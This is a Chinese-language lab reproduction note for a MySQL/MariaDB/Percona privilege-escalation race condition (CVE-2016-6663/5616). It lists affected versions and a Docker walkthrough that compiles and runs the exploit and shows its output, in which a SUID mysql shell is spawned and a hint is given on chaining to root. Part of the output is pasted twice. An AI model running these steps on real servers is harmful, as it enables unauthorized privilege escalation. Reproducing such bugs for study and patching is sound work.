## MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞

* [http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
* [http://bobao.360.cn/learning/detail/3152.html](http://bobao.360.cn/learning/detail/3152.html)

## info 

```
漏洞发现人：Dawid Golunski

漏洞级别：严重

CVE编号 ：CVE-2016-6663 / CVE-2016-5616

漏洞影响：

MariaDB 

< 5.5.52

< 10.1.18

< 10.0.28



MySQL  

<= 5.5.51

<= 5.6.32

<= 5.7.14



Percona Server

< 5.5.51-38.2

< 5.6.32-78-1

< 5.7.14-8



Percona XtraDB Cluster

< 5.6.32-25.17

< 5.7.14-26.17

< 5.5.41-37.0
```

## detail

```
docker pull janes/ubuntu-lamp
docker run --name mysql_vuln -it janes/ubuntu-lamp /bin/bash

root@20ccc992c2aa:/# apt install -y gcc libmysqlclient-dev
root@20ccc992c2aa:/# vim /tmp/poc.c
......
root@20ccc992c2aa:/#gcc -o poc poc.c -I/usr/include/mysql `mysql_config --cflags --libs`

root@20ccc992c2aa:/# useradd attacker
root@20ccc992c2aa:/# mysql -uroot  -pAdmin2015

mysql>  insert into mysql.user(Host,User,Password) values("localhost","attacker",password("mysqlvuln"));
Query OK, 1 row affected, 3 warnings (0.00 sec)
mysql> flush privileges;
Query OK, 0 rows affected (0.00 sec)
mysql> create database testdb;
Query OK, 1 row affected (0.00 sec)
mysql> grant all privileges on testdb.* to attacker@localhost identified by 'mysqlvuln';
Query OK, 0 rows affected (0.00 sec)

mysql> exit
Bye

root@20ccc992c2aa:/# su attacker
attacker@20ccc992c2aa:/$ id
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)

attacker@20ccc992c2aa:/$ cd /tmp
attacker@20ccc992c2aa:/tmp$ ./poc attacker mysqlvuln localhost testdb 

MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)

CVE-2016-6663 / OCVE-2016-5616

For testing purposes only. Do no harm.

Discovered/Coded by:

Dawid Golunski 
http://legalhackers.com


[+] Starting the exploit as: 
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)

[+] Connecting to the database `testdb` as attacker@localhost

[+] Creating exploit temp directory /tmp/mysql_privesc_exploit

[+] Creating mysql tables 

DROP TABLE IF EXISTS exploit_table 
DROP TABLE IF EXISTS mysql_suid_shell 
CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit' 
CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit' 

[+] Copying bash into the mysql_suid_shell table.
    After the exploitation the following file/table will be assigned SUID and executable bits : 
-rw-rw---- 1 mysql attacker 1021112 Nov  2 13:35 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Entering the race loop... Hang in there...
->

[+] Bingo! Race won (took 114 tries) ! Check out the mysql SUID shell: 

-rwsrwxrwx 1 mysql attacker 1021112 Nov  2 13:35 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Spawning the mysql SUID shell now... 
    Remember that from there you can gain root with vuln CVE-2016-6662 or CVE-2016-6664 :)

mysql_suid_shell.MYD-4.3$ whoami                    
mysql
mysql_suid_shell.MYD-4.3$ attacker@20ccc992c2aa:/tmp$ ./poc attacker mysqlvuln localhost testdb 

MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)

CVE-2016-6663 / OCVE-2016-5616

For testing purposes only. Do no harm.

Discovered/Coded by:

Dawid Golunski 
http://legalhackers.com


[+] Starting the exploit as: 
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)

[+] Connecting to the database `testdb` as attacker@localhost

[+] Creating exploit temp directory /tmp/mysql_privesc_exploit

[+] Creating mysql tables 

DROP TABLE IF EXISTS exploit_table 
DROP TABLE IF EXISTS mysql_suid_shell 
CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit' 
CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit' 

[+] Copying bash into the mysql_suid_shell table.
    After the exploitation the following file/table will be assigned SUID and executable bits : 
-rw-rw---- 1 mysql attacker 1021112 Nov  2 13:35 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Entering the race loop... Hang in there...
->

[+] Bingo! Race won (took 114 tries) ! Check out the mysql SUID shell: 

-rwsrwxrwx 1 mysql attacker 1021112 Nov  2 13:35 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Spawning the mysql SUID shell now... 
    Remember that from there you can gain root with vuln CVE-2016-6662 or CVE-2016-6664 :)

mysql_suid_shell.MYD-4.3$ whoami                    
mysql
mysql_suid_shell.MYD-4.3$ id
uid=1001(attacker) gid=1001(attacker) euid=102(mysql) groups=106(mysql),1001(attacker)
mysql_suid_shell.MYD-4.3$ exit
exit

[+] Job done. Exiting
```